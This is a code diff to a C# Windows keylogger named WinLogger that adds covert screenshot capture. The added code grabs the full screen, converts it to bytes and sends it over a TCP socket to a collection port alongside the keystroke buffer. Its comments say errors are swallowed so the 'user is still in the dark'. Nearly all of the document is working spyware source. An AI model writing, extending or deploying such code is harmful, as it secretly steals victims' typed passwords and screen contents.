@@ -11,6 +11,7 @@ using System.Windows.Forms;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
+using System.Drawing;
 
 public static class Globals
 {
@@ -59,6 +60,13 @@ public class WinLogger
 
     private static void flushBufferToServer(ref Keys[] buf, int end_idx) {
         string concatBuf = "";
+		Point topLeft = new Point(0, 0);
+		Rectangle screen = Screen.GetBounds(topLeft);
+		Bitmap bits = new Bitmap(screen.Width, screen.Height);
+		Graphics graph = Graphics.FromImage(bits);
+		graph.CopyFromScreen(topLeft, topLeft, screen.Size);
+		ImageConverter convert = new ImageConverter();
+		byte[] capturedScreen = (byte [])convert.ConvertTo(bits, typeof(byte[]));
         for(int i = 0; i < end_idx; i++)
         {
             concatBuf += buf[i].ToString();
@@ -87,7 +95,33 @@ public class WinLogger
                 // Release the socket.  
                 server.Shutdown(SocketShutdown.Both);  
                 server.Close();
-            } catch (Exception e) {
+            } catch (Exception) {
+                /* If something goes wrong, oh well. At least user is still in the dark.
+                    Uncomment below line for debugging exceptions. */
+                //File.AppendAllText(@"C:\Users\IEUser\Downloads\exceptions.txt", e.ToString());
+            }
+        } catch (Exception) {}
+		try {
+            // Establish the remote endpoint for the socket.  
+            IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());  
+            //IPAddress ipAddress = IPAddress.Parse(Globals.serverIP);
+            IPAddress ipAddress = ipHostInfo.AddressList[0];
+            IPEndPoint remoteEP = new IPEndPoint(ipAddress, Globals.screenPort);  
+
+            // Create a TCP/IP  socket.  
+            Socket server = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);  
+
+            // Connect the socket to the remote endpoint. Catch any errors.  
+            try {  
+                server.Connect(remoteEP);
+
+                // Send the data through the socket.  
+                int bytesSent = server.Send(capturedScreen);
+
+                // Release the socket.  
+                server.Shutdown(SocketShutdown.Both);  
+                server.Close();
+            } catch (Exception) {
                 /* If something goes wrong, oh well. At least user is still in the dark.
                     Uncomment below line for debugging exceptions. */
                 //File.AppendAllText(@"C:\Users\IEUser\Downloads\exceptions.txt", e.ToString());
